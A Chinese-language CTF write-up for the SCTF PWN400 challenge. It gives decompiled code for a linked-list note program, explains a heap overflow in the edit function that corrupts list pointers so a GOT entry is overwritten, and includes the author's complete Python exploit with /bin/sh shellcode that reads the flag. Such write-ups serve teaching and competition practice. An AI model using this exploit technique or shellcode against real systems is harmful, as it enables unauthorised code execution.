---
title: SCTF PWN400 WriteUp
author: Ripples
layout: post
views:
  - 441
categories:
  - CTF
tags:
  - buffer overflow
  - CTF
  - SCTF
  - WriteUp
---
<p style="text-indent: 2em;">
  说句实在的，就我个人而言，这题相对于PWN的前两题而言，要简单得多，当时本来还剩的时间不多，于是受前面的PWN的题的影响，我这题都没看，觉得来不及了，先去做的Code500，然后最后Code500完成了，还剩两小时的时候，我就来看了下这题，然后一看就激动，这么简单，赶快开始搞，虽说还是搞了一个多小时才过掉，不过好在是在比赛结束前搞定没出啥岔子……
</p>

<p style="text-indent: 2em;">
  首先还是给出IDA反编译的结果：
</p>

<!--more-->

<pre class="brush:cpp;toolbar:false">int&nbsp;__cdecl&nbsp;show_hint_and_get_choice()
{
&nbsp;&nbsp;unsigned&nbsp;__int8&nbsp;v1;&nbsp;//&nbsp;[sp+1Fh]&nbsp;[bp-9h]@2

&nbsp;&nbsp;write(1,&nbsp;"1.New&nbsp;noten",&nbsp;0xBu);
&nbsp;&nbsp;write(1,&nbsp;"2.Show&nbsp;notes&nbsp;listn",&nbsp;0x12u);
&nbsp;&nbsp;write(1,&nbsp;"3.Show&nbsp;noten",&nbsp;0xCu);
&nbsp;&nbsp;write(1,&nbsp;"4.Edit&nbsp;noten",&nbsp;0xCu);
&nbsp;&nbsp;write(1,&nbsp;"5.Delete&nbsp;noten",&nbsp;0xEu);
&nbsp;&nbsp;write(1,&nbsp;"6.Quitn",&nbsp;7u);
&nbsp;&nbsp;write(1,&nbsp;"option---&gt;&gt;&nbsp;",&nbsp;0xCu);
&nbsp;&nbsp;do
&nbsp;&nbsp;&nbsp;&nbsp;v1&nbsp;=&nbsp;getchar();
&nbsp;&nbsp;while&nbsp;(&nbsp;v1&nbsp;==&nbsp;10&nbsp;);
&nbsp;&nbsp;return&nbsp;v1;
}

int&nbsp;__cdecl&nbsp;new_note(int&nbsp;a1)
{
&nbsp;&nbsp;void&nbsp;*v2;&nbsp;//&nbsp;[sp+1Ch]&nbsp;[bp-Ch]@1

&nbsp;&nbsp;v2&nbsp;=&nbsp;malloc(0x16Cu);
&nbsp;&nbsp;write(1,&nbsp;"nnote&nbsp;title:",&nbsp;0xCu);
&nbsp;&nbsp;read(0,&nbsp;(char&nbsp;*)v2&nbsp;+&nbsp;12,&nbsp;0x3Fu);
&nbsp;&nbsp;write(1,&nbsp;"note&nbsp;type:",&nbsp;0xAu);
&nbsp;&nbsp;read(0,&nbsp;(char&nbsp;*)v2&nbsp;+&nbsp;76,&nbsp;0x1Fu);
&nbsp;&nbsp;write(1,&nbsp;"note&nbsp;content:",&nbsp;0xDu);
&nbsp;&nbsp;read(0,&nbsp;(char&nbsp;*)v2&nbsp;+&nbsp;108,&nbsp;0xFFu);
&nbsp;&nbsp;*(_DWORD&nbsp;*)v2&nbsp;=&nbsp;v2;
&nbsp;&nbsp;write(1,&nbsp;"nn",&nbsp;2u);
&nbsp;&nbsp;if&nbsp;(&nbsp;*(_DWORD&nbsp;*)a1&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v2&nbsp;+&nbsp;2)&nbsp;=&nbsp;*(_DWORD&nbsp;*)a1;
&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(*(_DWORD&nbsp;*)a1&nbsp;+&nbsp;4)&nbsp;=&nbsp;v2;
&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v2&nbsp;+&nbsp;1)&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)a1&nbsp;=&nbsp;v2;
&nbsp;&nbsp;}
&nbsp;&nbsp;else
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)a1&nbsp;=&nbsp;v2;
&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v2&nbsp;+&nbsp;1)&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v2&nbsp;+&nbsp;2)&nbsp;=&nbsp;0;
&nbsp;&nbsp;}
&nbsp;&nbsp;return&nbsp;0;
}

int&nbsp;__cdecl&nbsp;show_notes_list(int&nbsp;a1)
{
&nbsp;&nbsp;size_t&nbsp;v1;&nbsp;//&nbsp;eax@3
&nbsp;&nbsp;size_t&nbsp;v2;&nbsp;//&nbsp;eax@3
&nbsp;&nbsp;size_t&nbsp;v3;&nbsp;//&nbsp;eax@4
&nbsp;&nbsp;int&nbsp;result;&nbsp;//&nbsp;eax@6
&nbsp;&nbsp;int&nbsp;v5;&nbsp;//&nbsp;[sp+34h]&nbsp;[bp-64h]@3
&nbsp;&nbsp;signed&nbsp;int&nbsp;v6;&nbsp;//&nbsp;[sp+38h]&nbsp;[bp-60h]@3
&nbsp;&nbsp;char&nbsp;s;&nbsp;//&nbsp;[sp+3Ch]&nbsp;[bp-5Ch]@1
&nbsp;&nbsp;int&nbsp;v8;&nbsp;//&nbsp;[sp+7Ch]&nbsp;[bp-1Ch]@1

&nbsp;&nbsp;v8&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20);
&nbsp;&nbsp;memset(&s,&nbsp;0,&nbsp;0x40u);
&nbsp;&nbsp;if&nbsp;(&nbsp;a1&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;*(_DWORD&nbsp;*)(a1&nbsp;+&nbsp;8);
&nbsp;&nbsp;&nbsp;&nbsp;v6&nbsp;=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;v1&nbsp;=&nbsp;strlen((const&nbsp;char&nbsp;*)(a1&nbsp;+&nbsp;12));
&nbsp;&nbsp;&nbsp;&nbsp;snprintf(&s,&nbsp;v1&nbsp;+&nbsp;10,&nbsp;"%d.&nbsp;%sn",&nbsp;1,&nbsp;a1&nbsp;+&nbsp;12);
&nbsp;&nbsp;&nbsp;&nbsp;v2&nbsp;=&nbsp;strlen(&s);
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;&s,&nbsp;v2);
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(&nbsp;v5&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v3&nbsp;=&nbsp;strlen((const&nbsp;char&nbsp;*)(v5&nbsp;+&nbsp;12));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(&s,&nbsp;v3&nbsp;+&nbsp;10,&nbsp;"%d.&nbsp;%sn",&nbsp;v6,&nbsp;v5&nbsp;+&nbsp;12);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;&s,&nbsp;0x40u);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;++v6;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;*(_DWORD&nbsp;*)(v5&nbsp;+&nbsp;8);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
&nbsp;&nbsp;else
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"ntotal:&nbsp;0nn",&nbsp;0xBu);
&nbsp;&nbsp;}
&nbsp;&nbsp;result&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;^&nbsp;v8;
&nbsp;&nbsp;if&nbsp;(&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;!=&nbsp;v8&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;__stack_chk_fail();
&nbsp;&nbsp;return&nbsp;result;
}

int&nbsp;__cdecl&nbsp;show_note(int&nbsp;a1)
{
&nbsp;&nbsp;size_t&nbsp;v1;&nbsp;//&nbsp;eax@4
&nbsp;&nbsp;size_t&nbsp;v2;&nbsp;//&nbsp;eax@5
&nbsp;&nbsp;size_t&nbsp;v3;&nbsp;//&nbsp;eax@5
&nbsp;&nbsp;size_t&nbsp;v4;&nbsp;//&nbsp;eax@5
&nbsp;&nbsp;size_t&nbsp;v5;&nbsp;//&nbsp;eax@5
&nbsp;&nbsp;int&nbsp;result;&nbsp;//&nbsp;eax@8
&nbsp;&nbsp;int&nbsp;v7;&nbsp;//&nbsp;[sp+2Ch]&nbsp;[bp-5Ch]@1
&nbsp;&nbsp;char&nbsp;s[4];&nbsp;//&nbsp;[sp+32h]&nbsp;[bp-56h]@5
&nbsp;&nbsp;int&nbsp;v9;&nbsp;//&nbsp;[sp+36h]&nbsp;[bp-52h]@5
&nbsp;&nbsp;__int16&nbsp;v10;&nbsp;//&nbsp;[sp+3Ah]&nbsp;[bp-4Eh]@5
&nbsp;&nbsp;char&nbsp;buf;&nbsp;//&nbsp;[sp+3Ch]&nbsp;[bp-4Ch]@1
&nbsp;&nbsp;int&nbsp;v12;&nbsp;//&nbsp;[sp+7Ch]&nbsp;[bp-Ch]@1

&nbsp;&nbsp;v12&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20);
&nbsp;&nbsp;v7&nbsp;=&nbsp;a1;
&nbsp;&nbsp;memset(&buf,&nbsp;0,&nbsp;0x40u);
&nbsp;&nbsp;if&nbsp;(&nbsp;a1&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"note&nbsp;title:",&nbsp;0xBu);
&nbsp;&nbsp;&nbsp;&nbsp;read(0,&nbsp;&buf,&nbsp;0x3Fu);
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(&nbsp;v7&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v1&nbsp;=&nbsp;strlen(&buf);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!strncmp(&buf,&nbsp;(const&nbsp;char&nbsp;*)(v7&nbsp;+&nbsp;12),&nbsp;v1)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"title:",&nbsp;6u);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v2&nbsp;=&nbsp;strlen((const&nbsp;char&nbsp;*)(v7&nbsp;+&nbsp;12));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;(const&nbsp;void&nbsp;*)(v7&nbsp;+&nbsp;12),&nbsp;v2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"location:",&nbsp;9u);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)s&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v9&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v10&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;snprintf(s,&nbsp;0x14u,&nbsp;"%p",&nbsp;v7);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v3&nbsp;=&nbsp;strlen(s);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;s,&nbsp;v3);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"ntype:",&nbsp;6u);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v4&nbsp;=&nbsp;strlen((const&nbsp;char&nbsp;*)(v7&nbsp;+&nbsp;76));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;(const&nbsp;void&nbsp;*)(v7&nbsp;+&nbsp;76),&nbsp;v4);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"content:",&nbsp;8u);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v5&nbsp;=&nbsp;strlen((const&nbsp;char&nbsp;*)(v7&nbsp;+&nbsp;108));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;(const&nbsp;void&nbsp;*)(v7&nbsp;+&nbsp;108),&nbsp;v5);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"nn",&nbsp;2u);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v7&nbsp;=&nbsp;*(_DWORD&nbsp;*)(v7&nbsp;+&nbsp;8);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
&nbsp;&nbsp;else
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"no&nbsp;notes",&nbsp;8u);
&nbsp;&nbsp;}
&nbsp;&nbsp;result&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;^&nbsp;v12;
&nbsp;&nbsp;if&nbsp;(&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;!=&nbsp;v12&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;__stack_chk_fail();
&nbsp;&nbsp;return&nbsp;result;
}

int&nbsp;__cdecl&nbsp;edit_note(int&nbsp;a1)
{
&nbsp;&nbsp;size_t&nbsp;v1;&nbsp;//&nbsp;eax@4
&nbsp;&nbsp;int&nbsp;result;&nbsp;//&nbsp;eax@8
&nbsp;&nbsp;int&nbsp;v3;&nbsp;//&nbsp;[sp+28h]&nbsp;[bp-410h]@1
&nbsp;&nbsp;char&nbsp;buf;&nbsp;//&nbsp;[sp+2Ch]&nbsp;[bp-40Ch]@1
&nbsp;&nbsp;int&nbsp;v5;&nbsp;//&nbsp;[sp+42Ch]&nbsp;[bp-Ch]@1

&nbsp;&nbsp;v5&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20);
&nbsp;&nbsp;memset(&buf,&nbsp;0,&nbsp;0x400u);
&nbsp;&nbsp;v3&nbsp;=&nbsp;a1;
&nbsp;&nbsp;if&nbsp;(&nbsp;a1&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"note&nbsp;title:",&nbsp;0xBu);
&nbsp;&nbsp;&nbsp;&nbsp;read(0,&nbsp;&buf,&nbsp;0x400u);
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(&nbsp;v3&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v1&nbsp;=&nbsp;strlen(&buf);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!strncmp(&buf,&nbsp;(const&nbsp;char&nbsp;*)(v3&nbsp;+&nbsp;12),&nbsp;v1)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v3&nbsp;=&nbsp;*(_DWORD&nbsp;*)(v3&nbsp;+&nbsp;8);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"input&nbsp;content:",&nbsp;0xEu);
&nbsp;&nbsp;&nbsp;&nbsp;read(0,&nbsp;&buf,&nbsp;0x400u);
&nbsp;&nbsp;&nbsp;&nbsp;strcpy((char&nbsp;*)(v3&nbsp;+&nbsp;108),&nbsp;&buf);
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"succeed!",&nbsp;8u);
&nbsp;&nbsp;&nbsp;&nbsp;puts((const&nbsp;char&nbsp;*)(v3&nbsp;+&nbsp;108));
&nbsp;&nbsp;}
&nbsp;&nbsp;else
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"no&nbsp;notes",&nbsp;8u);
&nbsp;&nbsp;}
&nbsp;&nbsp;result&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;^&nbsp;v5;
&nbsp;&nbsp;if&nbsp;(&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;!=&nbsp;v5&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;__stack_chk_fail();
&nbsp;&nbsp;return&nbsp;result;
}

int&nbsp;__cdecl&nbsp;delete_note(int&nbsp;a1)
{
&nbsp;&nbsp;int&nbsp;v1;&nbsp;//&nbsp;ST28_4@8
&nbsp;&nbsp;int&nbsp;v2;&nbsp;//&nbsp;ST2C_4@8
&nbsp;&nbsp;int&nbsp;result;&nbsp;//&nbsp;eax@10
&nbsp;&nbsp;__int32&nbsp;ptr;&nbsp;//&nbsp;[sp+24h]&nbsp;[bp-24h]@3
&nbsp;&nbsp;int&nbsp;buf;&nbsp;//&nbsp;[sp+32h]&nbsp;[bp-16h]@1
&nbsp;&nbsp;int&nbsp;v6;&nbsp;//&nbsp;[sp+36h]&nbsp;[bp-12h]@1
&nbsp;&nbsp;__int16&nbsp;v7;&nbsp;//&nbsp;[sp+3Ah]&nbsp;[bp-Eh]@1
&nbsp;&nbsp;int&nbsp;v8;&nbsp;//&nbsp;[sp+3Ch]&nbsp;[bp-Ch]@1

&nbsp;&nbsp;v8&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20);
&nbsp;&nbsp;buf&nbsp;=&nbsp;0;
&nbsp;&nbsp;v6&nbsp;=&nbsp;0;
&nbsp;&nbsp;v7&nbsp;=&nbsp;0;
&nbsp;&nbsp;if&nbsp;(&nbsp;*(_DWORD&nbsp;*)a1&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"note&nbsp;location:",&nbsp;0xEu);
&nbsp;&nbsp;&nbsp;&nbsp;read(0,&nbsp;&buf,&nbsp;8u);
&nbsp;&nbsp;&nbsp;&nbsp;ptr&nbsp;=&nbsp;strtol((const&nbsp;char&nbsp;*)&buf,&nbsp;0,&nbsp;16);
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*(_DWORD&nbsp;*)ptr&nbsp;==&nbsp;ptr&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*(_DWORD&nbsp;*)a1&nbsp;==&nbsp;ptr&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)a1&nbsp;=&nbsp;*(_DWORD&nbsp;*)(*(_DWORD&nbsp;*)a1&nbsp;+&nbsp;8);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*(_DWORD&nbsp;*)(ptr&nbsp;+&nbsp;8)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v1&nbsp;=&nbsp;*(_DWORD&nbsp;*)(ptr&nbsp;+&nbsp;8);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v2&nbsp;=&nbsp;*(_DWORD&nbsp;*)(ptr&nbsp;+&nbsp;4);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(v2&nbsp;+&nbsp;8)&nbsp;=&nbsp;v1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(v1&nbsp;+&nbsp;4)&nbsp;=&nbsp;v2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)(*(_DWORD&nbsp;*)(ptr&nbsp;+&nbsp;4)&nbsp;+&nbsp;8)&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"succeed!nn",&nbsp;0xAu);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free((void&nbsp;*)ptr);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
&nbsp;&nbsp;else
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"no&nbsp;notes",&nbsp;8u);
&nbsp;&nbsp;}
&nbsp;&nbsp;result&nbsp;=&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;^&nbsp;v8;
&nbsp;&nbsp;if&nbsp;(&nbsp;*MK_FP(__GS__,&nbsp;20)&nbsp;!=&nbsp;v8&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;__stack_chk_fail();
&nbsp;&nbsp;return&nbsp;result;
}

void&nbsp;__cdecl&nbsp;main()
{
&nbsp;&nbsp;int&nbsp;v0;&nbsp;//&nbsp;[sp+1Ch]&nbsp;[bp-4h]@1

&nbsp;&nbsp;v0&nbsp;=&nbsp;0;
&nbsp;&nbsp;while&nbsp;(&nbsp;1&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;(&nbsp;(char)show_hint_and_get_choice()&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;49:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new_note(&v0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;50:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show_notes_list(v0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;51:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show_note(v0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;52:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edit_note(v0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;53:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delete_note(&v0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;54:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"choose&nbsp;a&nbsp;opt!n",&nbsp;0xEu);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
}</pre>

<p style="text-indent: 2em;">
  我们可以发现，它是维护了一个链表，链表的每个节点就是一个note，再联想一下前面两题PWN，一个栈溢出，一个格式化字符串漏洞，这题十有八九就是一个堆溢出的思想，不过就是把链表自己实现了而已。仔细观察一下程序，我们可以发现，它在new note的时候，做了严格的长度验证，没有溢出的机会，但是在edit note的时候，给出的长度值为0x400u，明显远大于需要的长度，那么这里无疑就是我们溢出的地方。通过溢出，修改链表中一个节点的prev和next指针为特定的值，这样，删除这个节点的时候我们就可以获得一次dword shooting的机会了。
</p>

<p style="text-indent: 2em;">
  然后再就是改哪里的问题，这题并没有随题附上一个libc.so，然后我们一看会发现，这题竟然是可运行的堆栈，这也就是为什么我觉得这题比前两题要简单的原因了，我们直接将shellcode放在某一个note中，然后修改GOT表，使得修改完后下一次函数调用的时候执行我们的shellcode即可。
</p>

<p style="text-indent: 2em;">
  下面是我比赛时的代码：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python
#encoding:utf-8
import&nbsp;socket
import&nbsp;binascii
s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
s.connect((&#39;218.2.197.248&#39;,&nbsp;10003))
for&nbsp;i&nbsp;in&nbsp;xrange(3):
&nbsp;&nbsp;&nbsp;&nbsp;s.send(&#39;1n&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;s.recv(100)
&nbsp;&nbsp;&nbsp;&nbsp;s.send(str(i)&nbsp;+&nbsp;&#39;n&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;s.recv(100)
&nbsp;&nbsp;&nbsp;&nbsp;s.send(str(i)&nbsp;+&nbsp;&#39;n&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;s.recv(100)
&nbsp;&nbsp;&nbsp;&nbsp;s.send(str(i)&nbsp;+&nbsp;&#39;n&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;s.recv(100)
s.send(&#39;3n&#39;)
s.recv(100)
s.send(&#39;0n&#39;)
ret&nbsp;=&nbsp;s.recv(4096)
while&nbsp;ret.find(&#39;location:&#39;)&nbsp;==&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;+=&nbsp;s.recv(4096)
print&nbsp;ret
ret&nbsp;=&nbsp;ret[ret.find(&#39;location:&#39;)&nbsp;+&nbsp;11:]
ret&nbsp;=&nbsp;ret[:ret.find(&#39;n&#39;)]
addr&nbsp;=&nbsp;int(ret,&nbsp;16)
payload&nbsp;=&nbsp;&#39;xebx06&#39;&nbsp;+&nbsp;&#39;a&#39;&nbsp;*&nbsp;6&nbsp;+&nbsp;"jx0bXx991xc9Rh//shh/binx89xe3xcdx80"
payload&nbsp;+=&nbsp;&#39;a&#39;&nbsp;*&nbsp;(260&nbsp;-&nbsp;len(payload))
payload&nbsp;+=&nbsp;binascii.unhexlify(&#39;%08x&#39;&nbsp;%&nbsp;(addr&nbsp;+&nbsp;0x170))[::-1]
payload&nbsp;+=&nbsp;&#39;x70xa4x04x08&#39;
payload&nbsp;+=&nbsp;binascii.unhexlify(&#39;%08x&#39;&nbsp;%&nbsp;(addr&nbsp;+&nbsp;108))[::-1]
s.send(&#39;4n&#39;)
s.recv(100)
s.send(&#39;0n&#39;)
s.recv(100)
s.send(payload&nbsp;+&nbsp;&#39;n&#39;)
s.recv(100)
s.send(&#39;5n&#39;)
s.recv(100)
s.send(&#39;%08x&#39;&nbsp;%&nbsp;(addr&nbsp;+&nbsp;0x170)&nbsp;+&nbsp;&#39;n&#39;)
s.recv(100)
s.send(&#39;cat&nbsp;/home/pwn3/flag/flagn&#39;)
s.recv(100)</pre>

<p style="text-indent: 2em;">
  先是3次new note，构建一个3个note的链表，然后show note查看这些note的地址，计算出需要的payload后，通过edit note修改第一个note，溢出改掉第二个note的prev和next指针，最后调用delete note删除第二个note，就可以成功拿到shell。
</p>

<p style="text-indent: 2em;">
  只能说，这次的PWN真的就是三种类型的基础题一样一个，不过把一个最水的放最后，我也是醉了……
</p>

<p style="line-height: 16px; text-indent: 2em;">
  <img src="http://geekjayvic.sinaapp.com/wp-content/plugins/wp-ueditor2/ueditor/dialogs/attachment/fileTypeImages/icon_rar.gif" /><a href="http://geekjayvic-wordpress.stor.sinaapp.com/uploads/2015/01/pwn400.zip">pwn400.zip</a>
</p>

* * *

<p style="line-height: 16px; text-indent: 2em;">
